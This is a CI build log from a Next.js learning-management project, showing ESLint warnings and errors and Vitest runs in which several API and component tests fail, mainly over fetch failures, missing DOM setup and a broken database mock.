2025-11-18T17:35:22.3433813Z 
2025-11-18T17:35:22.3434246Z /home/runner/work/fne-lms/fne-lms/pages/student/lesson/[lessonId].tsx
2025-11-18T17:35:22.3436371Z ##[warning]  266:6  warning  React Hook useEffect has missing dependencies: 'router' and 'supabase'. Either include them or remove the dependency array  react-hooks/exhaustive-deps
2025-11-18T17:35:22.3438232Z 
2025-11-18T17:35:22.3438623Z /home/runner/work/fne-lms/fne-lms/pages/test-login-flow.tsx
2025-11-18T17:35:22.3440445Z ##[warning]  18:6  warning  React Hook useEffect has a missing dependency: 'runTests'. Either include it or remove the dependency array  react-hooks/exhaustive-deps
2025-11-18T17:35:22.3442039Z 
2025-11-18T17:35:22.3442371Z /home/runner/work/fne-lms/fne-lms/pages/test-rbac.tsx
2025-11-18T17:35:22.3443748Z ##[error]  66:64  error  `'` can be escaped with `&apos;`, `&lsquo;`, `&#39;`, `&rsquo;`  react/no-unescaped-entities
2025-11-18T17:35:22.3445828Z ##[error]  67:26  error  `'` can be escaped with `&apos;`, `&lsquo;`, `&#39;`, `&rsquo;`  react/no-unescaped-entities
2025-11-18T17:35:22.3448136Z ##[error]  67:29  error  `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`  react/no-unescaped-entities
2025-11-18T17:35:22.3450109Z ##[error]  67:35  error  `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`  react/no-unescaped-entities
2025-11-18T17:35:22.3451418Z 
2025-11-18T17:35:22.3451770Z /home/runner/work/fne-lms/fne-lms/pages/test-sentry.tsx
2025-11-18T17:35:22.3452950Z ##[error]  73:25  error  `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`  react/no-unescaped-entities
2025-11-18T17:35:22.3454958Z ##[error]  73:43  error  `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`  react/no-unescaped-entities
2025-11-18T17:35:22.3456235Z 
2025-11-18T17:35:22.3457032Z /home/runner/work/fne-lms/fne-lms/pages/test/sequential-questions.tsx
2025-11-18T17:35:22.3458470Z ##[error]  27:27  error  `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`  react/no-unescaped-entities
2025-11-18T17:35:22.3460572Z ##[error]  27:48  error  `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`  react/no-unescaped-entities
2025-11-18T17:35:22.3461839Z 
2025-11-18T17:35:22.3462203Z /home/runner/work/fne-lms/fne-lms/pages/user/[userId].tsx
2025-11-18T17:35:22.3465043Z ##[warning]   75:6   warning  React Hook useEffect has missing dependencies: 'loadUserProfile' and 'supabase'. Either include them or remove the dependency array                                                                                                                             react-hooks/exhaustive-deps
2025-11-18T17:35:22.3470360Z ##[warning]  241:21  warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.3475753Z ##[warning]  314:25  warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.3478255Z 
2025-11-18T17:35:22.3478629Z /home/runner/work/fne-lms/fne-lms/scripts/check-database.js
2025-11-18T17:35:22.3480614Z ##[error]  74:9  error  Do not assign to the variable `module`. See: https://nextjs.org/docs/messages/no-assign-module-variable  @next/next/no-assign-module-variable
2025-11-18T17:35:22.3482230Z 
2025-11-18T17:35:22.3482699Z /home/runner/work/fne-lms/fne-lms/scripts/validate-course-conversion.js
2025-11-18T17:35:22.3484587Z ##[error]  113:12  error  Do not assign to the variable `module`. See: https://nextjs.org/docs/messages/no-assign-module-variable  @next/next/no-assign-module-variable
2025-11-18T17:35:22.3486211Z 
2025-11-18T17:35:22.3486625Z /home/runner/work/fne-lms/fne-lms/scripts/verify-course-data.js
2025-11-18T17:35:22.3488579Z ##[error]  43:10  error  Do not assign to the variable `module`. See: https://nextjs.org/docs/messages/no-assign-module-variable  @next/next/no-assign-module-variable
2025-11-18T17:35:22.3490168Z 
2025-11-18T17:35:22.3490638Z /home/runner/work/fne-lms/fne-lms/scripts/verify-supervisor-schema.js
2025-11-18T17:35:22.3491559Z   43:49  error  Parsing error: Unexpected token, expected "," (43:49)
2025-11-18T17:35:22.3491970Z 
2025-11-18T17:35:22.3492338Z /home/runner/work/fne-lms/fne-lms/test-column-mismatch.js
2025-11-18T17:35:22.3493267Z   22:9  error  Parsing error: Expecting Unicode escape sequence \uXXXX. (22:9)
2025-11-18T17:35:22.3493733Z 
2025-11-18T17:35:22.3494293Z /home/runner/work/fne-lms/fne-lms/tests/workspace/groupAssignmentComments.test.tsx
2025-11-18T17:35:22.3496982Z ##[warning]  120:6  warning  React Hook React.useEffect has a missing dependency: 'supabase'. Either include it or remove the dependency array  react-hooks/exhaustive-deps
2025-11-18T17:35:22.3498747Z 
2025-11-18T17:35:22.3499295Z ✖ 396 problems (125 errors, 271 warnings)
2025-11-18T17:35:22.3499608Z 
2025-11-18T17:35:22.3642117Z ##[group]Run echo "## ⚠️ Linting (Non-Blocking)" >> $GITHUB_STEP_SUMMARY
2025-11-18T17:35:22.3642668Z [36;1mecho "## ⚠️ Linting (Non-Blocking)" >> $GITHUB_STEP_SUMMARY[0m
2025-11-18T17:35:22.3643036Z [36;1mecho "" >> $GITHUB_STEP_SUMMARY[0m
2025-11-18T17:35:22.3643487Z [36;1mecho "Linting is currently non-blocking to unblock deployment." >> $GITHUB_STEP_SUMMARY[0m
2025-11-18T17:35:22.3644087Z [36;1mecho "See the 'Run linting' step logs above for any warnings or errors." >> $GITHUB_STEP_SUMMARY[0m
2025-11-18T17:35:22.3644542Z [36;1mecho "" >> $GITHUB_STEP_SUMMARY[0m
2025-11-18T17:35:22.3644959Z [36;1mecho "**Note:** Lint errors should be addressed in a follow-up PR." >> $GITHUB_STEP_SUMMARY[0m
2025-11-18T17:35:22.3678255Z shell: /usr/bin/bash -e {0}
2025-11-18T17:35:22.3678556Z env:
2025-11-18T17:35:22.3678810Z   NODE_VERSION: 18
2025-11-18T17:35:22.3679090Z   NEXT_PUBLIC_SUPABASE_URL: 
2025-11-18T17:35:22.3679359Z   NEXT_PUBLIC_SUPABASE_ANON_KEY: 
2025-11-18T17:35:22.3679654Z   SUPABASE_SERVICE_ROLE_KEY: 
2025-11-18T17:35:22.3679898Z ##[endgroup]
2025-11-18T17:35:22.3768557Z ##[group]Run npm run test
2025-11-18T17:35:22.3768871Z [36;1mnpm run test[0m
2025-11-18T17:35:22.3800167Z shell: /usr/bin/bash -e {0}
2025-11-18T17:35:22.3800441Z env:
2025-11-18T17:35:22.3800676Z   NODE_VERSION: 18
2025-11-18T17:35:22.3800947Z   NEXT_PUBLIC_SUPABASE_URL: 
2025-11-18T17:35:22.3801238Z   NEXT_PUBLIC_SUPABASE_ANON_KEY: 
2025-11-18T17:35:22.3801538Z   SUPABASE_SERVICE_ROLE_KEY: 
2025-11-18T17:35:22.3801797Z ##[endgroup]
2025-11-18T17:35:22.5146117Z 
2025-11-18T17:35:22.5148636Z > fne-lms-v2@1.0.1 test
2025-11-18T17:35:22.5153382Z > vitest run
2025-11-18T17:35:22.5153602Z 
2025-11-18T17:35:23.0300377Z 
2025-11-18T17:35:23.0303950Z [7m[1m[36m RUN [39m[22m[27m [36mv0.34.6[39m [90m/home/runner/work/fne-lms/fne-lms[39m
2025-11-18T17:35:23.0306110Z 
2025-11-18T17:35:24.0764763Z  [32m✓[39m __tests__/api/learning-paths/enhanced-progress.spec.ts [2m ([22m[2m33 tests[22m[2m)[22m[90m 16[2mms[22m[39m
2025-11-18T17:35:24.6053607Z [90mstderr[2m | unknown test[22m[39m
2025-11-18T17:35:24.6057159Z ⚠️  Node.js 18 and below are deprecated and will no longer be supported in future versions of @supabase/supabase-js. Please upgrade to Node.js 20 or later. For more information, visit: https://github.com/orgs/supabase/discussions/37217
2025-11-18T17:35:24.6058557Z 
2025-11-18T17:35:24.6679000Z [90mstdout[2m | __tests__/api/assignments/eligible-classmates.test.ts[2m > [22m[2m/api/assignments/eligible-classmates[2m > [22m[2mMulti-Role User Support[2m > [22m[2mshould handle users with multiple roles (docente + lider_generacion)[22m[39m
2025-11-18T17:35:24.6698035Z [eligible-classmates] REQUEST - userId: user-karla assignmentId: assignment-123 groupId: group-456
2025-11-18T17:35:24.6699367Z [eligible-classmates] STEP 1 - Membership check: {
2025-11-18T17:35:24.6723821Z   found: [33mtrue[39m,
2025-11-18T17:35:24.6724533Z   error: [90mundefined[39m,
2025-11-18T17:35:24.6725140Z   code: [90mundefined[39m,
2025-11-18T17:35:24.6726073Z   data: { group_id: [32m'group-456'[39m, assignment_id: [32m'assignment-123'[39m }
2025-11-18T17:35:24.6727028Z }
2025-11-18T17:35:24.6727296Z 
2025-11-18T17:35:24.7383765Z [90mstdout[2m | __tests__/api/assignments/eligible-classmates.test.ts[2m > [22m[2m/api/assignments/eligible-classmates[2m > [22m[2mMulti-Role User Support[2m > [22m[2mshould handle users with multiple roles (docente + lider_generacion)[22m[39m
2025-11-18T17:35:24.7386983Z [90mstderr[2m | __tests__/api/assignments/eligible-classmates.test.ts[2m > [22m[2m/api/assignments/eligible-classmates[2m > [22m[2mMulti-Role User Support[2m > [22m[2mshould handle users with multiple roles (docente + lider_generacion)[22m[39m
2025-11-18T17:35:24.7388849Z [eligible-classmates] ABORT - Group not found: group-456 error: {
2025-11-18T17:35:24.7389356Z   message: [32m'TypeError: fetch failed'[39m,
2025-11-18T17:35:24.7389755Z   details: [32m'TypeError: fetch failed\n'[39m +
2025-11-18T17:35:24.7390214Z     [32m'    at node:internal/deps/undici/undici:12637:11\n'[39m +
2025-11-18T17:35:24.7390788Z     [32m'    at processTicksAndRejections (node:internal/process/task_queues:95:5)\n'[39m +
2025-11-18T17:35:24.7391571Z     [32m'    at handler (/home/runner/work/fne-lms/fne-lms/pages/api/assignments/eligible-classmates.ts:77:48)\n'[39m +
2025-11-18T17:35:24.7392416Z     [32m'    at /home/runner/work/fne-lms/fne-lms/__tests__/api/assignments/eligible-classmates.test.ts:265:7\n'[39m +
2025-11-18T17:35:24.7393256Z     [32m'    at runTest (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:663:11)\n'[39m +
2025-11-18T17:35:24.7394098Z     [32m'    at runSuite (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:782:15)\n'[39m +
2025-11-18T17:35:24.7394936Z     [32m'    at runSuite (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:782:15)\n'[39m +
2025-11-18T17:35:24.7395988Z     [32m'    at runSuite (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:782:15)\n'[39m +
2025-11-18T17:35:24.7397149Z     [32m'    at runFiles (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:834:5)\n'[39m +
2025-11-18T17:35:24.7398050Z     [32m'    at startTests (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:843:3)'[39m,
2025-11-18T17:35:24.7398553Z   hint: [32m''[39m,
2025-11-18T17:35:24.7398773Z   code: [32m''[39m
2025-11-18T17:35:24.7398959Z }
2025-11-18T17:35:24.7399045Z 
2025-11-18T17:35:24.7399144Z <empty line>
2025-11-18T17:35:24.7960019Z [90mstderr[2m | __tests__/api/assignments/eligible-classmates.test.ts[2m > [22m[2m/api/assignments/eligible-classmates[2m > [22m[2mMulti-Role User Support[2m > [22m[2mshould prefer docente role when user has multiple roles[22m[39m
2025-11-18T17:35:24.7961869Z [eligible-classmates] ABORT - Group not found: group-456 error: {
2025-11-18T17:35:24.7962670Z   message: [32m'TypeError: fetch failed'[39m,
2025-11-18T17:35:24.7963342Z   details: [32m'TypeError: fetch failed\n'[39m +
2025-11-18T17:35:24.7964078Z     [32m'    at node:internal/deps/undici/undici:12637:11\n'[39m +
2025-11-18T17:35:24.7965034Z     [32m'    at processTicksAndRejections (node:internal/process/task_queues:95:5)\n'[39m +
2025-11-18T17:35:24.7965850Z     [32m'    at handler (/home/runner/work/fne-lms/fne-lms/pages/api/assignments/eligible-classmates.ts:77:48)\n'[39m +
2025-11-18T17:35:24.7966720Z     [32m'    at /home/runner/work/fne-lms/fne-lms/__tests__/api/assignments/eligible-classmates.test.ts:410:7\n'[39m +
2025-11-18T17:35:24.7967905Z     [32m'    at runTest (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:663:11)\n'[39m +
2025-11-18T17:35:24.7968749Z     [32m'    at runSuite (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:782:15)\n'[39m +
2025-11-18T17:35:24.7969585Z     [32m'    at runSuite (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:782:15)\n'[39m +
2025-11-18T17:35:24.7970410Z     [32m'    at runSuite (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:782:15)\n'[39m +
2025-11-18T17:35:24.7971241Z     [32m'    at runFiles (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:834:5)\n'[39m +
2025-11-18T17:35:24.7972061Z     [32m'    at startTests (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:843:3)'[39m,
2025-11-18T17:35:24.7972545Z   hint: [32m''[39m,
2025-11-18T17:35:24.7973091Z   code: [32m''[39m
2025-11-18T17:35:24.7973416Z }
2025-11-18T17:35:24.7973586Z 
2025-11-18T17:35:24.8479293Z [90mstderr[2m | __tests__/api/assignments/eligible-classmates.test.ts[2m > [22m[2m/api/assignments/eligible-classmates[2m > [22m[2mMulti-Role User Support[2m > [22m[2mshould fallback to estudiante role if no docente role with school_id[22m[39m
2025-11-18T17:35:24.8480431Z [eligible-classmates] ABORT - Group not found: group-456 error: {
2025-11-18T17:35:24.8480895Z   message: [32m'TypeError: fetch failed'[39m,
2025-11-18T17:35:24.8481276Z   details: [32m'TypeError: fetch failed\n'[39m +
2025-11-18T17:35:24.8481706Z     [32m'    at node:internal/deps/undici/undici:12637:11\n'[39m +
2025-11-18T17:35:24.8482276Z     [32m'    at processTicksAndRejections (node:internal/process/task_queues:95:5)\n'[39m +
2025-11-18T17:35:24.8483497Z     [32m'    at handler (/home/runner/work/fne-lms/fne-lms/pages/api/assignments/eligible-classmates.ts:77:48)\n'[39m +
2025-11-18T17:35:24.8485194Z     [32m'    at /home/runner/work/fne-lms/fne-lms/__tests__/api/assignments/eligible-classmates.test.ts:553:7\n'[39m +
2025-11-18T17:35:24.8487074Z     [32m'    at runTest (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:663:11)\n'[39m +
2025-11-18T17:35:24.8488623Z     [32m'    at runSuite (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:782:15)\n'[39m +
2025-11-18T17:35:24.8489844Z     [32m'    at runSuite (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:782:15)\n'[39m +
2025-11-18T17:35:24.8490744Z     [32m'    at runSuite (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:782:15)\n'[39m +
2025-11-18T17:35:24.8491570Z     [32m'    at runFiles (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:834:5)\n'[39m +
2025-11-18T17:35:24.8492391Z     [32m'    at startTests (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:843:3)'[39m,
2025-11-18T17:35:24.8492878Z   hint: [32m''[39m,
2025-11-18T17:35:24.8493097Z   code: [32m''[39m
2025-11-18T17:35:24.8493280Z }
2025-11-18T17:35:24.8493367Z 
2025-11-18T17:35:24.8619912Z [90mstderr[2m | __tests__/api/assignments/eligible-classmates.test.ts[2m > [22m[2m/api/assignments/eligible-classmates[2m > [22m[2mMulti-Role User Support[2m > [22m[2mshould return 403 when user has no roles with school_id[22m[39m
2025-11-18T17:35:24.8621721Z [eligible-classmates] ABORT - Group not found: group-456 error: {
2025-11-18T17:35:24.8622552Z   message: [32m'TypeError: fetch failed'[39m,
2025-11-18T17:35:24.8623228Z   details: [32m'TypeError: fetch failed\n'[39m +
2025-11-18T17:35:24.8623970Z     [32m'    at node:internal/deps/undici/undici:12637:11\n'[39m +
2025-11-18T17:35:24.8624950Z     [32m'    at processTicksAndRejections (node:internal/process/task_queues:95:5)\n'[39m +
2025-11-18T17:35:24.8626298Z     [32m'    at handler (/home/runner/work/fne-lms/fne-lms/pages/api/assignments/eligible-classmates.ts:77:48)\n'[39m +
2025-11-18T17:35:24.8628281Z     [32m'    at /home/runner/work/fne-lms/fne-lms/__tests__/api/assignments/eligible-classmates.test.ts:639:7\n'[39m +
2025-11-18T17:35:24.8629527Z     [32m'    at runTest (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:663:11)\n'[39m +
2025-11-18T17:35:24.8630419Z     [32m'    at runSuite (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:782:15)\n'[39m +
2025-11-18T17:35:24.8631264Z     [32m'    at runSuite (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:782:15)\n'[39m +
2025-11-18T17:35:24.8632101Z     [32m'    at runSuite (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:782:15)\n'[39m +
2025-11-18T17:35:24.8632926Z     [32m'    at runFiles (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:834:5)\n'[39m +
2025-11-18T17:35:24.8634001Z     [32m'    at startTests (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:843:3)'[39m,
2025-11-18T17:35:24.8634497Z   hint: [32m''[39m,
2025-11-18T17:35:24.8634715Z   code: [32m''[39m
2025-11-18T17:35:24.8634909Z }
2025-11-18T17:35:24.8635007Z 
2025-11-18T17:35:24.8635999Z [90mstderr[2m | __tests__/api/assignments/eligible-classmates.test.ts[2m > [22m[2m/api/assignments/eligible-classmates[2m > [22m[2mAuthorization[2m > [22m[2mshould reject if user is not member of the group[22m[39m
2025-11-18T17:35:24.8637604Z [eligible-classmates] ABORT - User not member: user-123 group: group-456 error: { message: [32m'Not found'[39m }
2025-11-18T17:35:24.8637999Z 
2025-11-18T17:35:24.8952010Z  [33m❯[39m __tests__/api/assignments/eligible-classmates.test.ts [2m ([22m[2m9 tests[22m [2m|[22m [31m5 failed[39m[2m)[22m[90m 287[2mms[22m[39m
2025-11-18T17:35:24.8955973Z [31m   [33m❯[31m __tests__/api/assignments/eligible-classmates.test.ts[2m > [22m/api/assignments/eligible-classmates[2m > [22mMulti-Role User Support[2m > [22mshould handle users with multiple roles (docente + lider_generacion)[39m
2025-11-18T17:35:24.8958880Z [31m     → expected "spy" to be called with arguments: [ 200 ]
2025-11-18T17:35:24.8959725Z 
2025-11-18T17:35:24.8960323Z Received: 
2025-11-18T17:35:24.8960900Z 
2025-11-18T17:35:24.8961377Z   1st spy call:
2025-11-18T17:35:24.8963913Z [90mstderr[2m | __tests__/api/assignments/eligible-classmates.test.ts[2m > [22m[2m/api/assignments/eligible-classmates[2m > [22m[2mAuthorization[2m > [22m[2mshould reject if group is consultant-managed[22m[39m
2025-11-18T17:35:24.8965807Z [eligible-classmates] ABORT - Group not found: group-456 error: {
2025-11-18T17:35:24.8966749Z   message: [32m'TypeError: fetch failed'[39m,
2025-11-18T17:35:24.8967871Z   details: [32m'TypeError: fetch failed\n'[39m +
2025-11-18T17:35:24.8968852Z     [32m'    at node:internal/deps/undici/undici:12637:11\n'[39m +
2025-11-18T17:35:24.8970010Z     [32m'    at processTicksAndRejections (node:internal/process/task_queues:95:5)\n'[39m +
2025-11-18T17:35:24.8971620Z     [32m'    at handler (/home/runner/work/fne-lms/fne-lms/pages/api/assignments/eligible-classmates.ts:77:48)\n'[39m +
2025-11-18T17:35:24.8973350Z     [32m'    at /home/runner/work/fne-lms/fne-lms/__tests__/api/assignments/eligible-classmates.test.ts:723:7\n'[39m +
2025-11-18T17:35:24.8975254Z     [32m'    at runTest (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:663:11)\n'[39m +
2025-11-18T17:35:24.8977261Z     [32m'    at runSuite (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:782:15)\n'[39m +
2025-11-18T17:35:24.8978897Z     [32m'    at runSuite (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:782:15)\n'[39m +
2025-11-18T17:35:24.8980539Z     [32m'    at runSuite (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:782:15)\n'[39m +
2025-11-18T17:35:24.8982049Z     [32m'    at runFiles (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:834:5)\n'[39m +
2025-11-18T17:35:24.8983463Z     [32m'    at startTests (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:843:3)'[39m,
2025-11-18T17:35:24.8984553Z   hint: [32m''[39m,
2025-11-18T17:35:24.8985055Z   code: [32m''[39m
2025-11-18T17:35:24.8985445Z }
2025-11-18T17:35:24.8985724Z 
2025-11-18T17:35:24.8985736Z 
2025-11-18T17:35:24.8985902Z   Array [
2025-11-18T17:35:24.8986280Z -   200,
2025-11-18T17:35:24.8986662Z +   404,
2025-11-18T17:35:24.8987531Z   ]
2025-11-18T17:35:24.8987759Z 
2025-11-18T17:35:24.8987768Z 
2025-11-18T17:35:24.8987996Z Number of calls: 1
2025-11-18T17:35:24.8988518Z [39m
2025-11-18T17:35:24.8990686Z [31m   [33m❯[31m __tests__/api/assignments/eligible-classmates.test.ts[2m > [22m/api/assignments/eligible-classmates[2m > [22mMulti-Role User Support[2m > [22mshould prefer docente role when user has multiple roles[39m
2025-11-18T17:35:24.8992765Z [31m     → expected undefined not to be undefined[39m
2025-11-18T17:35:24.8995184Z [31m   [33m❯[31m __tests__/api/assignments/eligible-classmates.test.ts[2m > [22m/api/assignments/eligible-classmates[2m > [22mMulti-Role User Support[2m > [22mshould fallback to estudiante role if no docente role with school_id[39m
2025-11-18T17:35:24.8997232Z [31m     → expected undefined not to be undefined[39m
2025-11-18T17:35:24.8999382Z [31m   [33m❯[31m __tests__/api/assignments/eligible-classmates.test.ts[2m > [22m/api/assignments/eligible-classmates[2m > [22mMulti-Role User Support[2m > [22mshould return 403 when user has no roles with school_id[39m
2025-11-18T17:35:24.9001197Z [31m     → expected "spy" to be called with arguments: [ 403 ]
2025-11-18T17:35:24.9001674Z 
2025-11-18T17:35:24.9001838Z Received: 
2025-11-18T17:35:24.9002048Z 
2025-11-18T17:35:24.9002313Z   1st spy call:
2025-11-18T17:35:24.9002504Z 
2025-11-18T17:35:24.9002799Z   Array [
2025-11-18T17:35:24.9003145Z -   403,
2025-11-18T17:35:24.9003530Z +   404,
2025-11-18T17:35:24.9003973Z   ]
2025-11-18T17:35:24.9004155Z 
2025-11-18T17:35:24.9004163Z 
2025-11-18T17:35:24.9004399Z Number of calls: 1
2025-11-18T17:35:24.9004857Z [39m
2025-11-18T17:35:24.9007217Z [31m   [33m❯[31m __tests__/api/assignments/eligible-classmates.test.ts[2m > [22m/api/assignments/eligible-classmates[2m > [22mAuthorization[2m > [22mshould reject if group is consultant-managed[39m
2025-11-18T17:35:24.9008965Z [31m     → expected "spy" to be called with arguments: [ 403 ]
2025-11-18T17:35:24.9009412Z 
2025-11-18T17:35:24.9009554Z Received: 
2025-11-18T17:35:24.9009835Z 
2025-11-18T17:35:24.9010069Z   1st spy call:
2025-11-18T17:35:24.9010287Z 
2025-11-18T17:35:24.9010528Z   Array [
2025-11-18T17:35:24.9010844Z -   403,
2025-11-18T17:35:24.9011323Z +   404,
2025-11-18T17:35:24.9011692Z   ]
2025-11-18T17:35:24.9011876Z 
2025-11-18T17:35:24.9011885Z 
2025-11-18T17:35:24.9012155Z Number of calls: 1
2025-11-18T17:35:24.9012610Z [39m
2025-11-18T17:35:25.3824286Z  [33m❯[39m tests/workspace/groupAssignmentComments.test.tsx [2m ([22m[2m9 tests[22m [2m|[22m [31m9 failed[39m[2m)[22m[90m 16[2mms[22m[39m
2025-11-18T17:35:25.3834605Z [31m   [33m❯[31m tests/workspace/groupAssignmentComments.test.tsx[2m > [22mGroupAssignmentsContent - Comment Count Feature[2m > [22mComment Count Loading[2m > [22mshould load and display comment counts for assignments[39m
2025-11-18T17:35:25.3836545Z [31m     → document is not defined[39m
2025-11-18T17:35:25.3838136Z [31m   [33m❯[31m tests/workspace/groupAssignmentComments.test.tsx[2m > [22mGroupAssignmentsContent - Comment Count Feature[2m > [22mComment Count Loading[2m > [22mshould show "0 comentarios" when no comments exist[39m
2025-11-18T17:35:25.3839228Z [31m     → document is not defined[39m
2025-11-18T17:35:25.3841172Z [31m   [33m❯[31m tests/workspace/groupAssignmentComments.test.tsx[2m > [22mGroupAssignmentsContent - Comment Count Feature[2m > [22mComment Count Loading[2m > [22mshould handle singular/plural correctly[39m
2025-11-18T17:35:25.3843190Z [31m     → document is not defined[39m
2025-11-18T17:35:25.3845925Z [31m   [33m❯[31m tests/workspace/groupAssignmentComments.test.tsx[2m > [22mGroupAssignmentsContent - Comment Count Feature[2m > [22mDiscussion Link Navigation[2m > [22mshould navigate to discussion page when clicking discussion link[39m
2025-11-18T17:35:25.3854119Z [31m     → document is not defined[39m
2025-11-18T17:35:25.3856491Z [31m   [33m❯[31m tests/workspace/groupAssignmentComments.test.tsx[2m > [22mGroupAssignmentsContent - Comment Count Feature[2m > [22mDiscussion Link Navigation[2m > [22mshould prevent main card click when clicking discussion link[39m
2025-11-18T17:35:25.3858588Z [31m     → document is not defined[39m
2025-11-18T17:35:25.3860480Z [31m   [33m❯[31m tests/workspace/groupAssignmentComments.test.tsx[2m > [22mGroupAssignmentsContent - Comment Count Feature[2m > [22mUI Display[2m > [22mshould show chat icon next to discussion text[39m
2025-11-18T17:35:25.3862481Z [31m     → document is not defined[39m
2025-11-18T17:35:25.3864536Z [31m   [33m❯[31m tests/workspace/groupAssignmentComments.test.tsx[2m > [22mGroupAssignmentsContent - Comment Count Feature[2m > [22mUI Display[2m > [22mshould apply hover styles to discussion link[39m
2025-11-18T17:35:25.3866108Z [31m     → document is not defined[39m
2025-11-18T17:35:25.3868433Z [31m   [33m❯[31m tests/workspace/groupAssignmentComments.test.tsx[2m > [22mGroupAssignmentsContent - Comment Count Feature[2m > [22mError Handling[2m > [22mshould handle errors when loading discussion counts[39m
2025-11-18T17:35:25.3870374Z [31m     → document is not defined[39m
2025-11-18T17:35:25.3872511Z [31m   [33m❯[31m tests/workspace/groupAssignmentComments.test.tsx[2m > [22mGroupAssignmentsContent - Comment Count Feature[2m > [22mConsultant View[2m > [22mshould not show discussion links for consultants[39m
2025-11-18T17:35:25.3874202Z [31m     → document is not defined[39m
2025-11-18T17:35:25.8702920Z  [33m❯[39m __tests__/api/admin/retrieve-import-passwords.test.ts [2m ([22m[2m20 tests[22m [2m|[22m [31m13 failed[39m[2m)[22m[90m 56[2mms[22m[39m
2025-11-18T17:35:25.8707048Z [31m   [33m❯[31m __tests__/api/admin/retrieve-import-passwords.test.ts[2m > [22m/api/admin/retrieve-import-passwords[2m > [22mAuthentication and Authorization[2m > [22mshould reject non-admin users[39m
2025-11-18T17:35:25.8712004Z [90mstderr[2m | __tests__/api/admin/retrieve-import-passwords.test.ts[2m > [22m[2m/api/admin/retrieve-import-passwords[2m > [22m[2mAuthentication and Authorization[2m > [22m[2mshould reject non-admin users[22m[39m
2025-11-18T17:35:25.8714703Z Error retrieving passwords: TypeError: supabaseAdmin.from(...).select(...).eq(...).eq(...).eq(...).limit is not a function
2025-11-18T17:35:25.8716630Z     at handler [90m(/home/runner/work/fne-lms/fne-lms/[39mpages/api/admin/retrieve-import-passwords.ts:53:8[90m)[39m
2025-11-18T17:35:25.8718592Z     at [90m/home/runner/work/fne-lms/fne-lms/[39m__tests__/api/admin/retrieve-import-passwords.test.ts:165:7
2025-11-18T17:35:25.8720648Z     at runTest [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:663:11[90m)[39m
2025-11-18T17:35:25.8722718Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:25.8724749Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:25.8727054Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:25.8728542Z     at runFiles [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:834:5[90m)[39m
2025-11-18T17:35:25.8730215Z     at startTests [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:843:3[90m)[39m
2025-11-18T17:35:25.8732045Z     at [90mfile:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4mvitest[24m/dist/entry.js:103:7
